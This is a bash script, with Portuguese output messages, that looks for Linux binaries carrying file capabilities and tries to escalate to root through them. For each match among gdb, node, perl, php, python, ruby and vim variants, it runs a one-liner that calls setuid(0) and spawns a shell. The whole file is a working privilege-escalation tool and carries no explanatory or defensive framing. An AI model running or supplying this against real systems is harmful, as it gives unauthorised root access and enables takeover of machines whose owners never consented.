#!/bin/bash
echo -e "\e[1;35m"
cat << "EOF"
  ____                  _     _ _ _ _   _           
 / ___|__ _ _ __   __ _| |__ (_) (_) |_(_) ___  ___ 
| |   / _` | '_ \ / _` | '_ \| | | | __| |/ _ \/ __|
| |__| (_| | |_) | (_| | |_) | | | | |_| |  __/\__ \
 \____\__,_| .__/ \__,_|_.__/|_|_|_|\__|_|\___||___/
           |_|                                      
EOF
echo -e "\e[0m"

echo -e "\e[1;35m"
echo "[*] ------------- Capabilities ------------"
echo "[*] Procurando binários com capabilities..."
echo "[*] ---------------------------------------"
echo -e "\e[0m"

cmd=$(getcap -r / 2>/dev/null)
echo "$cmd"
echo "$cmd" | while read -r l; do
    pathc=$(echo "$l" | cut -d' ' -f1)

    cap=$(basename "$pathc")

    case "$cap" in
        gdb)
            echo "[+] $pathc → com capabilities! Executando:"
            "$pathc" -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
            ;;
        node)
            echo "[+] $pathc → com capabilities! Executando:"
            "$pathc" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
            ;;
        perl)
            echo "[+] $pathc → com capabilities! Executando"
            "$pathc" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' </dev/tty
            ;;
        php)
            echo "[+] $pathc → com capabilities! Executando"
            CMD="/bin/sh"
            "$pathc" -r "posix_setuid(0); system('$CMD');" </dev/tty
            ;;
        python|python3)
            echo "[+] $pathc → com capabilities! Executando"
            "$pathc" -c 'import os; os.setuid(0); os.system("/bin/sh")' </dev/tty
            ;;
        ruby)
            echo "[+] $pathc → com capabilities! Executando"
            "$pathc" -e 'Process::Sys.setuid(0); exec "/bin/sh"' </dev/tty
            ;;
        rview|rvim)
            echo "[+] $pathc → com capabilities! Executando"
            "$pathc" -c ':lua os.execute("reset; exec sh")' </dev/tty
            ;;
        view|vim|vimdiff)
            echo "[+] $pathc → com capabilities! Executando"
            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' </dev/tty
            ;;
        *)
            ;;
    esac
done


